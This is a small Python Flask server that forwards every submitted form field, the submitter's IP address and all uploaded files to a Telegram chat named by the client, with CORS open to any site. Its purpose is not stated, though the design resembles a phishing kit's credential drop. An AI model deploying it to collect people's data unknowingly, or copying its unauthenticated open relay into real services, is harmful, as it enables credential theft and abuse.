import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not set")

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"


@app.route("/", methods=["GET"])
def home():
    return "Server running"


@app.route("/send", methods=["POST"])
def send():
    chat_id = request.form.get("chat_id")

    if not chat_id:
        return jsonify({"error": "chat_id missing"}), 400

    # ✅ GET USER IP ADDRESS (WORKS ON RENDER)
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    # -------- SEND TEXT --------
    text_lines = [
        "📱 New Submission",
        f"IP Address: {user_ip}",
        ""
    ]

    for key in request.form:
        if key != "chat_id":
            text_lines.append(f"{key}: {request.form.get(key)}")

    requests.post(
        f"{TG_API}/sendMessage",
        json={
            "chat_id": chat_id,
            "text": "\n".join(text_lines),
            "parse_mode": "Markdown"
        }
    )

    # -------- SEND ALL FILES --------
    for file_key in request.files:
        file = request.files[file_key]
        if file.filename:
            requests.post(
                f"{TG_API}/sendDocument",
                data={"chat_id": chat_id},
                files={"document": (file.filename, file.stream)}
            )

    return jsonify({"ok": True})